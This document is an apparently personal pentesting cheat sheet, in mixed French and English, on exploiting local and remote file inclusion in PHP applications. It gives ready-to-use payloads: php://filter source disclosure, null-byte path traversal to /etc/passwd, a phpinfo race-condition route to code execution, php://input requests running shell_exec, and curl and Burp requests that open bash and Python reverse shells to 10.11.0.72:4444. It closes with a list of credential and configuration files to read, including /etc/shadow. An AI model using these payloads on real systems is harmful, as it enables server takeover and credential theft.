# LFI / RFI

## RFI

* On Kali : `nc -nlvp <PORT>`
* On target : `param=http://<IP>/<PORT>/<FILE>`
  * If `http` wrapper is disable try `ftp` - `expect`

## LFI

### Manually

* `php://filter/convert.base64-encode/resource=`
  * Le wrapper encode le code source en base64, le serveur ne peut donc pas exécuter le code puisqu'il ne trouve pas le , il renvoie donc le base 64
  * Copy and paste result in `<file>` then `cat <file> |base64 -d`
* Null byte injection : `param=/etc/passwd%00`
  * Works in versions below php 5.3
* Display PHPINFO : `param=phpinfo`
  * Vérifier les élements suivants:
    * `allow_url_fopen`
    * `allow_url_include` : Si **Off** ont ne peut pas aller récupérer un fichier depuis un web server
    * `Supported filetypes`
* `curl -s --data-urlencode param=../../../../../../../../../etc/passwd http://<IP>/<PATH>/<FILE>.php`
* LFI to RCE via phpinfo() - Winning The Race
  * Si on peut GET phpinfo.php - peut upload fichier
    * Changer la requête en `POST`
    * Changer `Content-Type` en `multipart/form-data; boundary=--SomeTextHere`
    *   Ajouter

        ```
         ----SomeTextHere
         Content-Disposition: form-data; name="anything"; filename="FileName"
         Content-Type: text/plain
         
         This is the file content
         ----SomeTextHere
        ```
    * Envoyer la requete et verifier si dans la partie "PHP variable" un fichier nommé "FileName" est présent
      * Si oui on verra aussi son chemin
  * [https://www.insomniasec.com/downloads/publications/phpinfolfi.py](https://www.insomniasec.com/downloads/publications/phpinfolfi.py)
    * Make a request
    * Sent big file who takes PHP time to process
    * Soon as the page finish loading PHP delete the file
    * Hitting the LFI before PHP delete the file
    * Modify the script
      * `PAYLOAD` : Put the payload between the , can add a full RS PHP on several lines
      * `LFIREQ` : Adapt in function of your environment - the `%s` is the filename
    * Start the script : `python phpinfolfi.py <IP> <PORT> <THREADS-NUMBER>`

```
/proc/self/environ
/proc/self/fd
php://input
php://input%00
```

* Requete :

```
POST /section.php?page=php://input%00 HTTP/1.1
[...]
page=Exploit PHP Wrappers
```

* Reponse (si fonctionne, répétition de la variable page) :

```
HTTP/1.1 200 OK
[...]
page=Exploit PHP Wrappers
```

* Requete :

```
POST /section.php?page=php://input%00 HTTP/1.1
[...]
<?php echo shell_exec('id'); ?>
```

* Reponse (si fonctionne, exécute le code PHP) :

```
HTTP/1.1 200 OK
[...]
uid=48(<XXX>) gid=48(<XXX>) groups=48(<XXX>)
```

* Using curl to get command execution : `curl -X POST --data "<?php echo shell_exec('id'); ?>" "https://<IP>/<FILE>.php?page=php://input%00" -k -v`
*   Using Burp to get a bash reverse shell :

    ```
     POST /section.php?page=php://input%00 HTTP/1.1
     [...]
     <?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.72/4444 0>&1'); ?>        
    ```
* Using curl to get a bash reverse shell : - `curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/10.11.0.72/4444 0>&1'); ?>" "https://<IP>/<FILE>.php?page=php://input%00" -k -v`
*   Using Burp to get a python reverse shell :

    ```
     POST /section.php?page=php://input%00 HTTP/1.1
     [...]
     <?php echo shell_exec(' python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' '); ?>
    ```

    * /!\ Il faut \ les ' qui sont dans la commande python
* File to check
  * Unix
    * dolibar : /conf/conf.php
    * drupal : dbconfig.php
    * apache : /etc/apache2/apache2.conf - /etc/apache2/sites-available/default - /usr/local/etc/apache22/httpd.conf
    * /etc/passwd
    * /etc/shadow
    * /etc/group
    * /etc/sudoers
  * Windows
    * WiP
* PHP function `include()` execute PHP between `<?php ?>`
  * Except if we use `php://filter/convert.base64-encode`

### Automatically

* kadimus
